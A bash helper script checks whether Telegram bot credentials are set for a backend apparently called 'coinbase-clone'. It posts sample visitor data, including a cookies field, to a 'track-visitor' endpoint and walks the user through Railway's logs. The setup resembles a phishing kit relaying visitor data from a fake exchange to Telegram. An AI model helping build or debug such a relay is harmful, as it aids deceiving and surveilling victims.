#!/bin/bash

# Railway Environment Variable Checker
# This script helps verify if Telegram environment variables are set correctly

echo "🔍 Checking Railway Telegram Configuration"
echo "==========================================="
echo ""

echo "This will test if your Railway backend can access the Telegram variables."
echo ""

# Test the backend directly to see if Telegram is configured
echo "📡 Testing backend Telegram configuration..."
echo ""

# Make a test request and check server response
RESPONSE=$(curl -s https://coinbase-clone-production-8afd.up.railway.app/api/auth/track-visitor \
  -H "Content-Type: application/json" \
  -d '{"page":"/test","userAgent":"Test","platform":"Test","language":"en","screenResolution":"1920x1080","timezone":"UTC","cookies":"test","referrer":"test"}')

echo "✅ Backend response: $RESPONSE"
echo ""

echo "🔍 Now checking Railway deployment logs..."
echo ""
echo "Please do the following:"
echo ""
echo "1. Go to: https://railway.app/"
echo "2. Click on your backend project"
echo "3. Click on 'Deployments' tab"
echo "4. Click on the latest deployment"
echo "5. Click 'View Logs'"
echo ""
echo "Look for these messages in the logs:"
echo "   ✅ '✅ Telegram bot initialized' - means bot is configured"
echo "   ⚠️  '⚠️ Telegram bot not configured' - means variables are missing"
echo ""
echo "If you see the warning, the environment variables might not be set correctly."
echo ""
echo "To verify variables are set:"
echo "1. In Railway, click on your backend service"
echo "2. Click 'Variables' tab"
echo "3. Make sure you see:"
echo "   - TELEGRAM_BOT_TOKEN"
echo "   - TELEGRAM_CHAT_ID"
echo ""
echo "If variables are missing or wrong, update them and Railway will redeploy."
